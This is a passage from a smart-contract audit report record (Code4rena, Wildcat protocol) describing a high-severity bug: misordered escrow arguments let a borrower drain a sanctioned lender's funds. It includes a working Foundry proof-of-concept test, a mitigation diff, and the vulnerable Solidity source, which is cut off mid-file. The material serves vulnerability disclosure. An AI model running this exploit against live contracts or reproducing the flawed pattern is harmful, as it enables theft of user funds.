{
  "Title": "[H-06] Borrower can drain all funds of a sanctioned lender",
  "Content": "\n### Lines of code\n\n<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/WildcatSanctionsSentinel.sol#L96-L97><br>\n<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketBase.sol#L173-L174><br>\n<https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L166-L170>\n\n### Impact\n\nThe `WildcatMarketBase#_blockAccount()` function that is used to block a sanctioned lender contains a critical bug. It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentally creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.\n\nThe execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the `accountAddress` is sanctioned and if it is, then escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order.\n\nThat means whether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.\n\n### Proof of Concept\n\nConsider this scenario to illustrate how the issue can be exploited:\n1.  Bob The Borrower creates a market.\n2.  Bob authorizes Larry The Lender as a lender in the created market.\n3.  Larry deposits funds into the market.\n4.  Larry gets sanctioned in Chainalysis.\n5.  Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry's market tokens are transferred.\n6.  Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)`.\n7.  Bob initiates a withdrawal using  `WildcatMarket#queueWithdrawal()`.\n8.  After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` and gains access to all of Larry's assets.\n\nNow, let's delve into the specifics and mechanics of the vulnerability:\n\nThe `nukeFromOrbit()` function calls `_blockAccount(state, larryAddress)`, blocking Larry's account, creating an escrow, and transferring his market tokens to that escrow.\n\n```solidity\n//@audit                                                     Larry\n//@audit                                                       â†“\nfunction _blockAccount(MarketState memory state, address accountAddress) internal {\n  Account memory account = _accounts[accountAddress];\n  // ...\n  account.approval = AuthRole.Blocked;\n  // ...\n  account.scaledBalance = 0;\n  address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(\n\taccountAddress, //@audit â† Larry\n\tborrower,       //@audit â† Bob\n\taddress(this)\n  );\n  // ...\n  _accounts[escrow].scaledBalance += scaledBalance;\n  // ...\n}\n```\n\nIn the code snippet, notice the order of arguments passed to `createEscrow()`:\n\n```solidity\ncreateEscrow(accountAddress, borrower, address(this));\n```\n\nHowever, when we examine the `WildcatSanctionsSentinel#createEscrow()` implementation, we see a different order of arguments. This results in an incorrect construction of `tmpEscrowParams`:\n\n```solidity\nfunction createEscrow(\n\taddress borrower, //@audit â† Larry\n\taddress account,  //@audit â† Bob\n\taddress asset\n) public override returns (address escrowContract) {\n  // ...\n  // @audit                        ( Larry  ,   Bob  , asset)\n  // @audit                            â†“         â†“       â†“\n  tmpEscrowParams = TmpEscrowParams(borrower, account, asset);\n  new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();\n  // ...\n}\n```\n\nThe `tmpEscrowParams` are essential for setting up the escrow correctly. They are fetched in the constructor of `WildcatSanctionsEscrow`, and the order of these parameters is significant:\n\n```solidity\nconstructor() {\n  sentinel = msg.sender;  \n  (borrower, account, asset) = WildcatSanctionsSentinel(sentinel).tmpEscrowParams();\n//     â†‘        â†‘       â†‘   \n//(  Larry ,   Bob  , asset) are the params fetched here. @audit\n}\n```\n\nHowever, due to the misordered arguments in `_blockAccount()`, what's passed as `tmpEscrowParams` is `(borrower = Larry, account = Bob, asset)`, which is incorrect. This misordering affects the `canReleaseEscrow()` function, which determines whether `releaseEscrow()` should proceed or revert.\n\n```solidity\nfunction canReleaseEscrow() public view override returns (bool) {\n\t//@audit                                                 Larry      Bob\n\t//                                                         â†“         â†“\n\treturn !WildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);\n}\n```\n\nThe misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned.\n\n```solidity\n//@audit                       Larry              Bob\n//                               â†“                 â†“\nfunction isSanctioned(address borrower, address account) public view override returns (bool) {\n return\n   !sanctionOverrides[borrower][account] && // true\n   IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account); // false\n}\n```\n\nThus `isSanctioned()` returns `false` and consequently `canReleaseEscrow()` returns `true`. This allows Bob to successfully execute `releaseEscrow()` and drain all of Larry's market tokens:\n\n```solidity\nfunction releaseEscrow() public override {\n  if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n\n  uint256 amount = balance();\n  \n  //@audit                 Bob   Larry's $\n  //                        â†“       â†“\n  IERC20(asset).transfer(account, amount);\n\n  emit EscrowReleased(account, asset, amount);\n}\n```\n\nAfter this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.\n\nBelow is a PoC demonstrating how to execute the exploit. To proceed, please include the following import statements in `test/market/WildcatMarketConfig.t.sol`:\n\n```solidity\nimport 'src/WildcatSanctionsEscrow.sol';\n\nimport \"forge-std/console2.sol\";\n```\n\nAdd the following test `test/market/WildcatMarketConfig.t.sol` as well:\n\n```solidity\nfunction test_borrowerCanStealSanctionedLendersFunds() external {\n  vm.label(borrower, \"bob\"); // Label borrower for better trace readability\n\n  // This is Larry The Lender\n  address larry = makeAddr(\"larry\");\n\n  // Larry deposists 10e18 into Bob's market\n  _deposit(larry, 10e18);\n\n  // Larry's been a bad guy and gets sanctioned\n  sanctionsSentinel.sanction(larry);\n\n  // Larry gets nuked by the borrower\n  vm.prank(borrower);\n  market.nukeFromOrbit(larry);\n\n  // The vulnerable escrow in which Larry's funds get moved\n  address vulnerableEscrow = sanctionsSentinel.getEscrowAddress(larry, borrower, address(market));\n  vm.label(vulnerableEscrow, \"vulnerableEscrow\");\n\n  // Ensure Larry's funds have been moved to his escrow\n  assertEq(market.balanceOf(larry), 0);\n  assertEq(market.balanceOf(vulnerableEscrow), 10e18);\n\n  // Malicious borrower is able to release the escrow due to the vulnerability\n  vm.prank(borrower);\n  WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();\n\n  // Malicious borrower has all of Larry's tokens\n  assertEq(market.balanceOf(borrower), 10e18);\n\n  // The borrower authorizes himself as a lender in the market\n  _authorizeLender(borrower);\n\n  // Queue withdrawal of all funds\n  vm.prank(borrower);\n  market.queueWithdrawal(10e18);\n\n  // Fast-forward to when the batch duration expires\n  fastForward(parameters.withdrawalBatchDuration);\n  uint32 expiry = uint32(block.timestamp);\n\n  // Execute the withdrawal\n  market.executeWithdrawal(borrower, expiry);\n\n  // Assert the borrower has drained all of Larry's assets\n  assertEq(asset.balanceOf(borrower), 10e18);\n}\n```\n\nRun the PoC like this:\n\n```sh\nforge test --match-test test_borrowerCanStealSanctionedLendersFunds -vvvv\n```\n\n### Recommended Mitigation Steps\n\nFix the order of parameters in `WildcatSanctionsSentinel#createEscrow(borrower, account, asset)`:\n\n```diff\n  function createEscrow(\n-   address borrower,\n+   address account,\n-   address account,\n+   address borrower,\n    address asset\n  ) public override returns (address escrowContract) {\n```\n\n### Assessed type\n\nError\n\n**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/68#issuecomment-1803354649):**\n > Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/2e111fc1f20d707eb78ac8a34eac4f751f6da474).\n\n**[laurenceday (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/68#issuecomment-1810740649)**\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-10-wildcat",
  "Code": [
    {
      "filename": "src/WildcatSanctionsSentinel.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport { IChainalysisSanctionsList } from './interfaces/IChainalysisSanctionsList.sol';\nimport { IWildcatArchController } from './interfaces/IWildcatArchController.sol';\nimport { IWildcatSanctionsSentinel } from './interfaces/IWildcatSanctionsSentinel.sol';\nimport { SanctionsList } from './libraries/Chainalysis.sol';\nimport { WildcatSanctionsEscrow } from './WildcatSanctionsEscrow.sol';\n\ncontract WildcatSanctionsSentinel is IWildcatSanctionsSentinel {\n  bytes32 public constant override WildcatSanctionsEscrowInitcodeHash =\n    keccak256(type(WildcatSanctionsEscrow).creationCode);\n\n  address public immutable override chainalysisSanctionsList;\n\n  address public immutable override archController;\n\n  TmpEscrowParams public override tmpEscrowParams;\n\n  mapping(address borrower => mapping(address account => bool sanctionOverride))\n    public\n    override sanctionOverrides;\n\n  constructor(address _archController, address _chainalysisSanctionsList) {\n    archController = _archController;\n    chainalysisSanctionsList = _chainalysisSanctionsList;\n    _resetTmpEscrowParams();\n  }\n\n  function _resetTmpEscrowParams() internal {\n    tmpEscrowParams = TmpEscrowParams(address(1), address(1), address(1));\n  }\n\n  /**\n   * @dev Returns boolean indicating whether `account` is sanctioned\n   *      on Chainalysis and that status has not been overridden by\n   *      `borrower`.\n   */\n  function isSanctioned(address borrower, address account) public view override returns (bool) {\n    return\n      !sanctionOverrides[borrower][account] &&\n      IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account);\n  }\n\n  /**\n   * @dev Overrides the sanction status of `account` for `borrower`.\n   */\n  function overrideSanction(address account) public override {\n    sanctionOverrides[msg.sender][account] = true;\n    emit SanctionOverride(msg.sender, account);\n  }\n\n  /**\n   * @dev Removes the sanction override of `account` for `borrower`.\n   */\n  function removeSanctionOverride(address account) public override {\n    sanctionOverrides[msg.sender][account] = false;\n    emit SanctionOverrideRemoved(msg.sender, account);\n  }\n\n  /**\n   * @dev Calculate the create2 escrow address for the combination\n   *      of `borrower`, `account`, and `asset`.\n   */\n  function getEscrowAddress(\n    address borrower,\n    address account,\n    address asset\n  ) public view override returns (address escrowAddress) {\n    return\n      address(\n        uint160(\n          uint256(\n            keccak256(\n              abi.encodePacked(\n                bytes1(0xff),\n                address(this),\n                keccak256(abi.encode(borrower, account, asset)),\n                WildcatSanctionsEscrowInitcodeHash\n              )\n            )\n          )\n        )\n      );\n  }\n\n  /**\n   * @dev Creates a new WildcatSanctionsEscrow contract for `borrower`,\n   *      `account`, and `asset` or returns the existing escrow contract\n   *      if one already exists.\n   *\n   *      The escrow contract is added to the set of sanction override\n   *      addresses for `borrower` so that it can not be blocked.\n   */\n  function createEscrow(\n    address borrower,\n    address account,\n    address asset\n  ) public override returns (address escrowContract) {\n    if (!IWildcatArchController(archController).isRegisteredMarket(msg.sender)) {\n      revert NotRegisteredMarket();\n    }\n\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n\n    tmpEscrowParams = TmpEscrowParams(borrower, account, asset);\n\n    new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();\n\n    emit NewSanctionsEscrow(borrower, account, asset);\n\n    sanctionOverrides[borrower][escrowContract] = true;\n\n    emit SanctionOverride(borrower, escrowContract);\n\n    _resetTmpEscrowParams();\n  }\n}"
    },
    {
      "filename": "src/market/WildcatMarketBase.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport '../libraries/FeeMath.sol';\nimport '../libraries/Withdrawal.sol';\nimport { queryName, querySymbol } from '../libraries/StringQuery.sol';\nimport '../interfaces/IMarketEventsAndErrors.sol';\nimport '../interfaces/IWildcatMarketController.sol';\nimport '../interfaces/IWildcatSanctionsSentinel.sol';\nimport { IERC20, IERC20Metadata } from '../interfaces/IERC20Metadata.sol';\nimport '../ReentrancyGuard.sol';\nimport '../libraries/BoolUtils.sol';\n\ncontract WildcatMarketBase is ReentrancyGuard, IMarketEventsAndErrors {\n  using WithdrawalLib for MarketState;\n  using SafeCastLib for uint256;\n  using MathUtils for uint256;\n  using BoolUtils for bool;\n\n  // ==================================================================== //\n  //                       Market Config (immutable)                       //\n  // ==================================================================== //\n\n  string public constant version = '1.0';\n\n  /// @dev Account with blacklist control, used for blocking sanctioned addresses.\n  address public immutable sentinel;\n\n  /// @dev Account with authority to borrow assets from the market.\n  address public immutable borrower;\n\n  /// @dev Account that receives protocol fees.\n  address public immutable feeRecipient;\n\n  /// @dev Protocol fee added to interest paid by borrower.\n  uint256 public immutable protocolFeeBips;\n\n  /// @dev Penalty fee added to interest earned by lenders, does not affect protocol fee.\n  uint256 public immutable delinquencyFeeBips;\n\n  /// @dev Time after which delinquency incurs penalty fee.\n  uint256 public immutable delinquencyGracePeriod;\n\n  /// @dev Address of the Market Controller.\n  address public immutable controller;\n\n  /// @dev Address of the underlying asset.\n  address public immutable asset;\n\n  /// @dev Time before withdrawal batches are processed.\n  uint256 public immutable withdrawalBatchDuration;\n\n  /// @dev Token decimals (same as underlying asset).\n  uint8 public immutable decimals;\n\n  /// @dev Token name (prefixed name of underlying asset).\n  string public name;\n\n  /// @dev Token symbol (prefixed symbol of underlying asset).\n  string public symbol;\n\n  // ===================================================================== //\n  //                             Market State                               //\n  // ===================================================================== //\n\n  MarketState internal _state;\n\n  mapping(address => Account) internal _accounts;\n\n  WithdrawalData internal _withdrawalData;\n\n  // ===================================================================== //\n  //                             Constructor                               //\n  // ===================================================================== //\n\n  constructor() {\n    MarketParameters memory parameters = IWildcatMarketController(msg.sender).getMarketParameters();\n\n    if ((parameters.protocolFeeBips > 0).and(parameters.feeRecipient == address(0))) {\n      revert FeeSetWithoutRecipient();\n    }\n    if (parameters.annualInterestBips > BIP) {\n      revert InterestRateTooHigh();\n    }\n    if (parameters.reserveRatioBips > BIP) {\n      revert ReserveRatioBipsTooHigh();\n    }\n    if (parameters.protocolFeeBips > BIP) {\n      revert InterestFeeTooHigh();\n    }\n    if (parameters.delinquencyFeeBips > BIP) {\n      revert PenaltyFeeTooHigh();\n    }\n\n    // Set asset metadata\n    asset = parameters.asset;\n    name = string.concat(parameters.namePrefix, queryName(parameters.asset));\n    symbol = string.concat(parameters.symbolPrefix, querySymbol(parameters.asset));\n    decimals = IERC20Metadata(parameters.asset).decimals();\n\n    _state = MarketState({\n      isClosed: false,\n      maxTotalSupply: parameters.maxTotalSupply,\n      accruedProtocolFees: 0,\n      normalizedUnclaimedWithdrawals: 0,\n      scaledTotalSupply: 0,\n      scaledPendingWithdrawals: 0,\n      pendingWithdrawalExpiry: 0,\n      isDelinquent: false,\n      timeDelinquent: 0,\n      annualInterestBips: parameters.annualInterestBips,\n      reserveRatioBips: parameters.reserveRatioBips,\n      scaleFactor: uint112(RAY),\n      lastInterestAccruedTimestamp: uint32(block.timestamp)\n    });\n\n    sentinel = parameters.sentinel;\n    borrower = parameters.borrower;\n    controller = parameters.controller;\n    feeRecipient = parameters.feeRecipient;\n    protocolFeeBips = parameters.protocolFeeBips;\n    delinquencyFeeBips = parameters.delinquencyFeeBips;\n    delinquencyGracePeriod = parameters.delinquencyGracePeriod;\n    withdrawalBatchDuration = parameters.withdrawalBatchDuration;\n  }\n\n  // ===================================================================== //\n  //                              Modifiers                                //\n  // ===================================================================== //\n\n  modifier onlyBorrower() {\n    if (msg.sender != borrower) revert NotApprovedBorrower();\n    _;\n  }\n\n  modifier onlyController() {\n    if (msg.sender != controller) revert NotController();\n    _;\n  }\n\n  // ===================================================================== //\n  //                       Internal State Getters                          //\n  // ===================================================================== //\n\n  /**\n   * @dev Retrieve an account from storage.\n   *\n   *      Reverts if account is blocked.\n   */\n  function _getAccount(address accountAddress) internal view returns (Account memory account) {\n    account = _accounts[accountAddress];\n    if (account.approval == AuthRole.Blocked) {\n      revert AccountBlacklisted();\n    }\n  }\n\n  /**\n   * @dev Block an account and transfer its balance of market tokens\n   *      to an escrow contract.\n   *\n   *      If the account is already blocked, this function does nothing.\n   */\n  function _blockAccount(MarketState memory state, address accountAddress) internal {\n    Account memory account = _accounts[accountAddress];\n    if (account.approval != AuthRole.Blocked) {\n      uint104 scaledBalance = account.scaledBalance;\n      account.approval = AuthRole.Blocked;\n      emit AuthorizationStatusUpdated(accountAddress, AuthRole.Blocked);\n\n      if (scaledBalance > 0) {\n        account.scaledBalance = 0;\n        address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(\n          accountAddress,\n          borrower,\n          address(this)\n        );\n        emit Transfer(accountAddress, escrow, state.normalizeAmount(scaledBalance));\n        _accounts[escrow].scaledBalance += scaledBalance;\n        emit SanctionedAccountAssetsSentToEscrow(\n          accountAddress,\n          escrow,\n          state.normalizeAmount(scaledBalance)\n        );\n      }\n      _accounts[accountAddress] = account;\n    }\n  }\n\n  /**\n   * @dev Retrieve an account from storage and assert that it has at\n   *      least the required role.\n   *\n   *      If the account's role is not set, queries the controller to\n   *      determine if it is an approved lender; if it is, its role\n   *      is initialized to DepositAndWithdraw.\n   */\n  function _getAccountWithRole(\n    address accountAddress,\n    AuthRole requiredRole\n  ) internal returns (Account memory account) {\n    account = _getAccount(accountAddress);\n    // If account role is null, see if it is authorized on controller.\n    if (account.approval == AuthRole.Null) {\n      if (IWildcatMarketController(controller).isAuthorizedLender(accountAddress)) {\n        account.approval = AuthRole.DepositAndWithdraw;\n        emit AuthorizationStatusUpdated(accountAddress, AuthRole.DepositAndWithdraw);\n      }\n    }\n    // If account role is insufficient, revert.\n    if (uint256(account.approval) < uint256(requiredRole)) {\n      revert NotApprovedLender();\n    }\n  }\n\n  // ===================================================================== //\n  //                       External State Getters                          //\n  // ===================================================================== //\n\n  /**\n   * @dev Returns the amount of underlying assets the borrower is obligated\n   *      to maintain in the market to avoid delinquency.\n   */\n  function coverageLiquidity() external view nonReentrantView returns (uint256) {\n    return currentState().liquidityRequired();\n  }\n\n  /**\n   * @dev Returns the scale factor (in ray) used to convert scaled balances\n   *      to normalized balances.\n   */\n  function scaleFactor() external view nonReentrantView returns (uint256) {\n    return currentState().scaleFactor;\n  }\n\n  /**\n   * @dev Total balance in underlying asset.\n   */\n  function totalAssets() public view returns (uint256) {\n    return IERC20(asset).balanceOf(address(this));\n  }\n\n  /**\n   * @dev Returns the amount of underlying assets the borrower is allowed\n   *      to borrow.\n   *\n   *      This is the balance of underlying assets minus:\n   *      - pending (unpaid) withdrawals\n   *      - paid withdrawals\n   *      - reserve ratio times the portion of the supply not pending withdrawal\n   *      - protocol fees\n   */\n  function borrowableAssets() external view nonReentrantView returns (uint256) {\n    return currentState().borrowableAssets(totalAssets());\n  }\n\n  /**\n   * @dev Returns the amount of protocol fees (in underlying asset amount)\n   *      that have accrued and are pending withdrawal.\n   */\n  function accruedProtocolFees() external view nonReentrantView returns (uint256) {\n    return currentState().accruedProtocolFees;\n  }\n\n  /**\n   * @dev Returns the state of the market as of the last update.\n   */\n  function previousState() external view returns (MarketState memory) {\n    return _state;\n  }\n\n  /**\n   * @dev Return the state the market would have at the current block after applying\n   *      interest and fees accrued since the last update and processing the pending\n   *      withdrawal batch if it is expired.\n   */\n  function currentState() public view nonReentrantView returns (MarketState memory state) {\n    (state, , ) = _calculateCurrentState();\n  }\n\n  /**\n   * @dev Returns the scaled total supply the vaut would have at the current block\n   *      after applying interest and fees accrued since the last update and burning\n   *      market tokens for the pending withdrawal batch if it is expired.\n   */\n  function scaledTotalSupply() external view nonReentrantView returns (uint256) {\n    return currentState().scaledTotalSupply;\n  }\n\n  /**\n   * @dev Returns the scaled balance of `account`\n   */\n  function scaledBalanceOf(address account) external view nonReentrantView returns (uint256) {\n    return _accounts[account].scaledBalance;\n  }\n\n  /**\n   * @dev Returns current role of `account`.\n   */\n  function getAccountRole(address account) external view nonReentrantView returns (AuthRole) {\n    return _accounts[account].approval;\n  }\n\n  /**\n   * @dev Returns the amount of protocol fees that are currently\n   *      withdrawable by the fee recipient.\n   */\n  function withdrawableProtocolFees() external view returns (uint128) {\n    return currentState().withdrawableProtocolFees(totalAssets());\n  }\n\n  /**\n   * @dev Calculate effective interest rate currently paid by borrower.\n   *      Borrower pays base APR, protocol fee (on base APR) and delinquency\n   *      fee (if delinquent beyond grace period).\n   *\n   * @return apr paid by borrower in ray\n   */\n  function effectiveBorrowerAPR() external view returns (uint256) {\n    MarketState memory state = currentState();\n    // apr + (apr * protocolFee)\n    uint256 apr = MathUtils.bipToRay(state.annualInterestBips).bipMul(BIP + protocolFeeBips);\n    if (state.timeDelinquent > delinquencyGracePeriod) {\n      apr += MathUtils.bipToRay(delinquencyFeeBips);\n    }\n    return apr;\n  }\n\n  /**\n   * @dev Calculate effective interest rate currently earned by lenders.\n   *     Lenders earn base APR and delinquency fee (if delinquent beyond grace period)\n   *\n   * @return apr earned by lender in ray\n   */\n  function effectiveLenderAPR() external view returns (uint256) {\n    MarketState memory state = currentState();\n    uint256 apr = state.annualInterestBips;\n    if (state.timeDelinquent > delinquencyGracePeriod) {\n      apr += delinquencyFeeBips;\n    }\n    return MathUtils.bipToRay(apr);\n  }\n\n  // /*//////////////////////////////////////////////////////////////\n  //                     Internal State Handlers\n  // //////////////////////////////////////////////////////////////*/\n\n  /**\n   * @dev Returns cached MarketState after accruing interest and delinquency / protocol fees\n   *      and processing expired withdrawal batch, if any.\n   *\n   *      Used by functions that make additional changes to `state`.\n   *\n   *      NOTE: Returned `state` does not match `_state` if interest is accrued\n   *            Calling function must update `_state` or revert.\n   *\n   * @return state Market state after interest is accrued.\n   */\n  function _getUpdatedState() internal returns (MarketState memory state) {\n    state = _state;\n    // Handle expired withdrawal batch\n    if (state.hasPendingExpiredBatch()) {\n      uint256 expiry = state.pendingWithdrawalExpiry;\n      // Only accrue interest if time has passed since last update.\n      // This will only be false if withdrawalBatchDuration is 0.\n      if (expiry != state.lastInterestAccruedTimestamp) {\n        (uint256 baseInterestRay, uint256 delinquencyFeeRay, uint256 protocolFee) = state\n          .updateScaleFactorAndFees(\n            protocolFeeBips,\n            delinquencyFeeBips,\n            delinquencyGracePeriod,\n            expiry\n          );\n        emit ScaleFactorUpdated(state.scaleFactor, baseInterestRay, delinquencyFeeRay, protocolFee);\n      }\n      _processExpiredWithdrawalBatch(state);\n    }\n    // Apply interest and fees accrued since last update (expiry or previous tx)\n    if (block.timestamp != state.lastInterestAccruedTimestamp) {\n      (uint256 baseInterestRay, uint256 delinquencyFeeRay, uint256 protocolFee) = state\n        .updateScaleFactorAndFees(\n          protocolFeeBips,\n          delinquencyFeeBips,\n          delinquencyGracePeriod,\n          block.timestamp\n        );\n      emit ScaleFactorUpdated(state.scaleFactor, baseInterestRay, delinquencyFeeRay, protocolFee);\n    }\n  }\n\n  /**\n   * @dev Calculate the current state, applying fees and interest accrued since\n   *      the last state update as well as the effects of withdrawal batch expiry\n   *      on the market state.\n   *      Identical to _getUpdatedState() except it does not modify storage or\n   *      or emit events.\n   *      Returns expired batch data, if any, so queries against batches have\n   *      access to the most recent data.\n   */\n  function _calculateCurrentState()\n    internal\n    view\n    returns (\n      MarketState memory state,\n      uint32 expiredBatchExpiry,\n      WithdrawalBatch memory expiredBatch\n    )\n  {\n    state = _state;\n    // Handle expired withdrawal batch\n    if (state.hasPendingExpiredBatch()) {\n      expiredBatchExpiry = state.pendingWithdrawalExpiry;\n      // Only accrue interest if time has passed since last update.\n      // This will only be false if withdrawalBatchDuration is 0.\n      if (expiredBatchExpiry != state.lastInterestAccruedTimestamp) {\n        state.updateScaleFactorAndFees(\n          protocolFeeBips,\n          delinquencyFeeBips,\n          delinquencyGracePeriod,\n          expiredBatchExpiry\n        );\n      }\n\n      expiredBatch = _withdrawalData.batches[expiredBatchExpiry];\n      uint256 availableLiquidity = expiredBatch.availableLiquidityForPendingBatch(\n        state,\n        totalAssets()\n      );\n      if (availableLiquidity > 0) {\n        _applyWithdrawalBatchPaymentView(expiredBatch, state, availableLiquidity);\n      }\n      state.pendingWithdrawalExpiry = 0;\n    }\n\n    if (state.lastInterestAccruedTimestamp != block.timestamp) {\n      state.updateScaleFactorAndFees(\n        protocolFeeBips,\n        delinquencyFeeBips,\n        delinquencyGracePeriod,\n        block.timestamp\n      );\n    }\n  }\n\n  /**\n   * @dev Writes the cached MarketState to storage and emits an event.\n   *      Used at the end of all functions which modify `state`.\n   */\n  function _writeState(MarketState memory state) internal {\n    bool isDelinquent = state.liquidityRequired() > totalAssets();\n    state.isDelinquent = isDelinquent;\n    _state = state;\n    emit StateUpdated(state.scaleFactor, isDelinquent);\n  }\n\n  /**\n   * @dev Handles an expired withdrawal batch:\n   *      - Retrieves the amount of underlying assets that can be used to pay for the batch.\n   *      - If the amount is sufficient to pay the full amount owed to the batch, the batch\n   *        is closed and the total withdrawal amount is reserved.\n   *      - If the amount is insufficient to pay the full amount owed to the batch, the batch\n   *        is recorded as an unpaid batch and the available assets are reserved.\n   *      - The assets reserved for the batch are scaled by the current scale factor and that\n   *        amount of scaled tokens is burned, ensuring borrowers do not continue paying interest\n   *        on withdrawn assets.\n   */\n  function _processExpiredWithdrawalBatch(MarketState memory state) internal {\n    uint32 expiry = state.pendingWithdrawalExpiry;\n    WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n\n    // Burn as much of the withdrawal batch as possible with available liquidity.\n    uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());\n    if (availableLiquidity > 0) {\n      _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);\n    }\n\n    emit WithdrawalBatchExpired(\n      expiry,\n      batch.scaledTotalAmount,\n      batch.scaledAmountBurned,\n      batch.normalizedAmountPaid\n    );\n\n    if (batch.scaledAmountBurned < batch.scaledTotalAmount) {\n      _withdrawalData.unpaidBatches.push(expiry);\n    } else {\n      emit WithdrawalBatchClosed(expiry);\n    }\n\n    state.pendingWithdrawalExpiry = 0;\n\n    _withdrawalData.batches[expiry] = batch;\n  }\n\n  /**\n   * @dev Process withdrawal payment, burning market tokens and reserving\n   *      underlying assets so they are only available for withdrawals.\n   */\n  function _applyWithdrawalBatchPayment(\n    WithdrawalBatch memory batch,\n    MarketState memory state,\n    uint32 expiry,\n    uint256 availableLiquidity\n  ) internal {\n    uint104 scaledAvailableLiquidity = state.scaleAmount(availableLiquidity).toUint104();\n    uint104 scaledAmountOwed = batch.scaledTotalAmount - batch.scaledAmountBurned;\n    // Do nothing if batch is already paid\n    if (scaledAmountOwed == 0) {\n      return;\n    }\n    uint104 scaledAmountBurned = uint104(MathUtils.min(scaledAvailableLiquidity, scaledAmountOwed));\n    uint128 normalizedAmountPaid = state.normalizeAmount(scaledAmountBurned).toUint128();\n\n    batch.scaledAmountBurned += scaledAmountBurned;\n    batch.normalizedAmountPaid += normalizedAmountPaid;\n    state.scaledPendingWithdrawals -= scaledAmountBurned;\n\n    // Update normalizedUnclaimedWithdrawals so the tokens are only accessible for withdrawals.\n    state.normalizedUnclaimedWithdrawals += normalizedAmountPaid;\n\n    // Burn market tokens to stop interest accrual upon withdrawal payment.\n    state.scaledTotalSupply -= scaledAmountBurned;\n\n    // Emit transfer for external trackers to indicate burn.\n    emit Transfer(address(this), address(0), normalizedAmountPaid);\n    emit WithdrawalBatchPayment(expiry, scaledAmountBurned, normalizedAmountPaid);\n  }\n\n  function _applyWithdrawalBatchPaymentView(\n    WithdrawalBatch memory batch,\n    MarketState memory state,\n    uint256 availableLiquidity\n  ) internal pure {\n    uint104 scaledAvailableLiquidity = state.scaleAmount(availableLiquidity).toUint104();\n    uint104 scaledAmountOwed = batch.scaledTotalAmount - batch.scaledAmountBurned;\n    // Do nothing if batch is already paid\n    if (scaledAmountOwed == 0) {\n      return;\n    }\n    uint104 scaledAmountBurned = uint104(MathUtils.min(scaledAvailableLiquidity, scaledAmountOwed));\n    uint128 normalizedAmountPaid = state.normalizeAmount(scaledAmountBurned).toUint128();\n\n    batch.scaledAmountBurned += scaledAmountBurned;\n    batch.normalizedAmountPaid += normalizedAmountPaid;\n    state.scaledPendingWithdrawals -= scaledAmountBurned;\n\n    // Update normalizedUnclaimedWithdrawals so the tokens are only accessible for withdrawals.\n    state.normalizedUnclaimedWithdrawals += normalizedAmountPaid;\n\n    // Burn market tokens to stop interest accrual upon withdrawal payment.\n    state.scaledTotalSupply -= scaledAmountBurned;\n  }\n}"
    },
    {
      "filename": "src/market/WildcatMarketWithdrawals.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport './WildcatMarketBase.sol';\nimport '../libraries/MarketState.sol';\nimport '../libraries/FeeMath.sol';\nimport '../libraries/FIFOQueue.sol';\nimport '../interfaces/IWildcatSanctionsSentinel.sol';\nimport 'solady/utils/SafeTransferLib.sol';\n\ncontract WildcatMarketWithdrawals is WildcatMarketBase {\n  using SafeTransferLib for address;\n  using MathUtils for uint256;\n  using SafeCastLib for uint256;\n  using BoolUtils for bool;\n\n  /* -------------------------------------------------------------------------- */\n  /*                             Withdrawal Queries                             */\n  /* -------------------------------------------------------------------------- */\n\n  /**\n   * @dev Returns the expiry timestamp of every unpaid withdrawal batch.\n   */\n  function getUnpaidBatchExpiries() external view nonReentrantView returns (uint32[] memory) {\n    return _withdrawalData.unpaidBatches.values();\n  }\n\n  function getWithdrawalBatch(\n    uint32 expiry\n  ) external view nonReentrantView returns (WithdrawalBatch memory) {\n    (, uint32 expiredBatchExpiry, WithdrawalBatch memory expiredBatch) = _calculateCurrentState();\n    if ((expiry == expiredBatchExpiry).and(expiry > 0)) {\n      return expiredBatch;\n    }\n    return _withdrawalData.batches[expiry];\n  }\n\n  function getAccountWithdrawalStatus(\n    address accountAddress,\n    uint32 expiry\n  ) external view nonReentrantView returns (AccountWithdrawalStatus memory) {\n    return _withdrawalData.accountStatuses[expiry][accountAddress];\n  }\n\n  function getAvailableWithdrawalAmount(\n    address accountAddress,\n    